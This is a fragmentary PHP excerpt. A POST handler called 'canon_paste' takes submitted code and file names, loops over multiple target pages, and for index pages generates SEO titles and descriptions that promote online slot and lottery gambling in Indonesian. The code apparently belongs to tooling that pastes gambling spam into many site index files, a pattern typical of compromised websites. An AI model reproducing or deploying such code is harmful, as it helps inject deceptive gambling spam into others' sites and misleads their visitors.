    ...
    if ($act==='canon_paste' && isset($_POST['canon_code'],$_POST['canon_fname'])) {
        ...
        foreach ($targets as $tidx => $t) {
            ...
            if ($isIndex) {
                ...
                $prompt .= ' 1. title: 50-65 karakter, mengandung kata kunci, menarik klik, UNIK.';
                $prompt .= ' 2. description: 140-155 karakter, kata kunci natural, manfaat jelas, ajakan bertindak.';
                ...
                if ($title === '') {
                    ...
                    $title = $lastSeg.' - '.$kws[$tidx%count($kws)].' 2026';
                    if (strlen($title)>65) $title = $kws[$tidx%count($kws)].' 2026 - Daftar & Menang';
                }
                if ($desc === '') $desc = 'Mainkan slot gacor dan togel online terpercaya di '.$lastSeg.'. RTP tertinggi, jackpot terbesar, bonus new member, withdraw tercepat. Daftar sekarang!';
                if ($h1  === '') $h1   = $lastSeg.' - '.ucwords($kwPick).' Terpercaya';
            }
